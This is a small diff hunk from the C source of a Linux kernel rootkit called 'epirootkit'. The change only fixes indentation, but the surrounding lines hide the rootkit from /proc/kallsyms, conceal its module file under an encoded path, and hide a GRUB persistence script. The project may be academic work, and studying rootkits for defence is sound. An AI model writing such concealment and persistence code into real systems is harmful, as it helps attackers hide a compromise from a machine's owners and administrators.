@@ -66,7 +66,7 @@ int init_interceptor(void) {
     alterate_add("/proc/kallsyms", -1, "epirootkit", NULL, NULL);
 
     // Genreral hiding for epirootkit module file in base64
-     hide_file("/usr/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv");
+    hide_file("/usr/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv");
 
     // Hide grub peristence stuff
     hide_file("/.grub.sh");
